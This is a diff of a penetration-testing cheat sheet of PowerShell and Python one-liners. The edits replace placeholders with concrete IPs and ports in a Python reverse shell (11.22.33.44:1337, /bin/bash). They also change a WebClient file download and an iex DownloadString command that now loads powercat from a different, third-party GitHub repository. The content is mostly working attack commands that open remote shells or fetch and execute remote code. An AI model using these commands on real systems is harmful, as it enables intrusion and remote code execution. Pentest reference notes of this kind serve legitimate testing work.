@@ -2,7 +2,7 @@
 
 ### Download file
 ```powershell
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.22.33.44/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.22.33.44/wget.exe','C:\Users\test\Desktop\wget.exe')"
 ```
 
 ### Reverse shell
@@ -17,7 +17,7 @@ powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4
 
 ### Load a remote powercat script
 ```powershell
-iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/0xc0de44/0xc0de/master/tools/powercat.ps1')
 ```
 
 ### Generate encoded payload (here a reverse shell)
@@ -33,6 +33,6 @@ powershell -E <encoded payload>
 
 ### Reverse shell
 ```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("11.22.33.44",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
